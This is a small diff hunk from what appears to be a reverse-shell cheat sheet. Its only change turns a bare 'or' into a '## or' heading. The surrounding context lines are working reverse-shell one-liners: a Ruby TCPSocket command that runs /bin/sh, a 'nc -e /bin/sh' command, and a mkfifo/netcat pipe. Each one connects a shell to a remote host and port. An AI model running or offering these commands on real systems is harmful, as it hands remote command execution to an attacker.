@@ -17,7 +17,7 @@ ruby -rsocket -e'f=TCPSocket.open("192.168.1.2",443).to_i;exec sprintf("/bin/sh 
 
 ## netcat
 nc -e /bin/sh 192.168.1.2 443
-or
+## or
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
 
 ## java
